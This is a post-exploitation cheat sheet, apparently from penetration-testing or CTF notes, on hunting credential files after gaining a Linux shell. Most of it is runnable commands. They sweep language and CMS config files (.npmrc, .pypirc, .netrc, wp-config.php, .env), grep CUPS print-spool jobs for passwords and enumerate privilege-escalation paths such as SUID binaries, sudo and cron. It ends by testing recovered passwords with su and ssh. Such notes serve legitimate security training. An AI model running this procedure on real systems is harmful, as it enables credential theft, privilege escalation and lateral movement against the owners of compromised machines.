# Linux Credential File Hunt

## When this applies

- After gaining initial shell access on Linux foothold.
- Goal: find language/framework-specific credential stores for password reuse against other services or root.

## Technique

Each language ecosystem has standard credential file locations. Frameworks/CMSs hardcode DB credentials in known config files. Sweep for these immediately after foothold.

## Steps

```bash
# Ruby
find /home -name ".bundle" -type d 2>/dev/null   # ~/.bundle/config stores gem source creds
cat /home/*/.bundle/config                        # Format: BUNDLE_HTTPS://RUBYGEMS__ORG/: "user:pass"
find / -name "database.yml" 2>/dev/null           # Rails DB credentials
find / -name ".gem/credentials" 2>/dev/null       # RubyGems API keys

# Python
find /home -name ".pypirc" 2>/dev/null            # PyPI credentials
find /home -name ".netrc" 2>/dev/null             # Generic auth (pip, curl, etc.)

# Node.js
find /home -name ".npmrc" 2>/dev/null             # npm registry tokens
find /home -name ".yarnrc" 2>/dev/null            # Yarn registry tokens

# PHP Frameworks/CMS
find /var/www -path "*/conf/conf.php" 2>/dev/null       # Dolibarr ERP (DB creds in $dolibarr_main_db_pass)
find /var/www -name "wp-config.php" 2>/dev/null          # WordPress
find /var/www -name "configuration.php" 2>/dev/null      # Joomla
find /var/www -path "*/sites/default/settings.php" 2>/dev/null  # Drupal

# General
find /home -name ".env" -o -name "*.conf" -o -name "*.ini" 2>/dev/null
find /opt /var/www -name "config*" -type f 2>/dev/null

# CUPS print-spool — past print jobs may contain printed credentials.
# When in group `lp` (e.g. after CUPS RCE foothold), spool dir 0710 root:lp lets you cat
# known paths even though `ls /var/spool/cups` is denied. CUPS spec layout:
#   /var/spool/cups/d<JOBID>-001     # data file 1 (PostScript / PDF / raw)
#   /var/spool/cups/d<JOBID>-NNN     # additional documents in same job
#   /var/spool/cups/c<JOBID>         # control file (job metadata)
# JOBIDs are 5-digit zero-padded: d00001-001, d00002-001, ...
for i in $(seq -f '%05g' 1 50); do
    cat /var/spool/cups/d${i}-001 2>/dev/null \
        | grep -aiE 'pass|secret|cred|token|key' | head
done
# PostScript jobs render printable text inside `( ... ) s` show operators —
# grep those directly or convert offline: ps2pdf <file> out.pdf
```

## General Linux privesc enumeration commands

```bash
# System enumeration
uname -a
cat /etc/os-release
id

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Sudo permissions
sudo -l

# Capabilities
getcap -r / 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Search for credentials
grep -r "password" /home 2>/dev/null
find / -name "*.conf" -exec grep -i "pass" {} \; 2>/dev/null

# Run LinPEAS
./linpeas.sh

# Check for kernel exploits
./linux-exploit-suggester.sh
```

## Verifying success

- Credential found maps to another user, root, or peer service.
- Test reuse: `su <user>` or `ssh <user>@<peer>` with the recovered password.

## Common pitfalls

- Ruby `~/.bundle/config` format is unusual: `BUNDLE_HTTPS://RUBYGEMS__ORG/: "user:pass"` (double-underscore separator in env-var-mangled form).
- PHP CMS configs sometimes use `define()` instead of plain assignment — grep needs to match both syntaxes.
- `/etc/shadow` is rarely directly readable but always check — root reuse against domain accounts is common.

## Tools

- find / grep
- LinPEAS
- LinEnum
- pspy (process monitoring)
- Linux Exploit Suggester
